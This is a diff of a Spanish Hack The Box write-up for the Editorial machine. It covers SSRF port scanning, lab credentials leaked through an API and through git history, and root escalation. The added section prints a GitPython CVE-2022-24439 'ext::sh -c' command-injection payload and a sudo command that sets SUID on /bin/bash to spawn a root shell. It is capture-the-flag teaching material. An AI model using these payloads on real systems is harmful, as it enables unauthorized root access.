@@ -1,6 +1,7 @@
 ---
 title: Editorial - Hack The Box
 date: 2024-10-04
+description: Maquina Editorial (Easy) de Hack The Box.
 categories:
     - Writeups
     - HTB
@@ -39,7 +40,7 @@ En upload, permite proveer libros a la web de dos formas: subiendo el fichero o 
 
 Al subir un fichero o facilitar una URL, devuelve la URL del fichero subido:
 
-```HTTP
+```
 HTTP/1.1 200 OK
 Server: nginx/1.18.0 (Ubuntu)
 Date: Wed, 02 Oct 2024 14:52:31 GMT
@@ -49,6 +50,7 @@ Content-Length: 51`
 
 static/uploads/61089ce8-87f6-4a5f-83e6-1e21a65c3335`
 ```
+
 ## Explotación
 
 Pasándole como URL la localhost y atacando los 65532 puertos se puede evaluar, viendo el tamaño del "`Content-Length`" si hay una respuesta distinta, lo que puede implicar que el puerto esté abierto y respondiendo solo a consultas internas.
@@ -65,8 +67,9 @@ Una consulta POST contra "/api/latest/metadata/messages/authors" devuelve una UR
 ```json
 {"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}`
 ```
-Username: dev 
-Password: dev080217_devAPI!@
+
+>Username: dev  
+>Password: dev080217_devAPI!@  
 
 El usuario tiene acceso por SSH y al conectarse se obtiene la User Flag.
 
@@ -95,7 +98,7 @@ Nada destacable.
 En la carpeta home existe la carpeta `.git`
 Con `git log` se ve un commit con la información:
 
-```git
+```
 commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
 Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
 Date:   Sun Apr 30 20:55:08 2023 -0500
@@ -106,6 +109,7 @@ Date:   Sun Apr 30 20:55:08 2023 -0500
 ```
 
 Consultando los cambios de este commit con `git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae` se extrae un usuario y contraseña de producción:
+
 ```bash
 WARNING: terminal is not fully functional
 Press RETURN to continue 
@@ -131,8 +135,9 @@ index 61b786f..3373b14 100644
  
 # -------------------------------
 ```
-Username: prod
-Password: 080217_Producti0n_2023!@
+
+>Username: prod  
+>Password: 080217_Producti0n_2023!@  
 
 Accediendo a este usuario por SSH se observa que no tiene credenciales de root:
 ```bash
@@ -169,3 +174,23 @@ url_to_clone = sys.argv[1]
 r = Repo.init('', bare=True)
 r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
 ```
+
+Esta aplicación es vulnerable a RCE segun el [CVE-2022-24439](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858):
+
+```python
+from git import Repo
+r = Repo.init('', bare=True)
+r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
+```
+
+Por lo que se modifica bash para permitir el escalado:
+
+```bash
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'
+
+$ /bin/bash -p
+bash-5.1# whoami
+root
+```
+
+Como root se tiene acceso a la Root Flag.
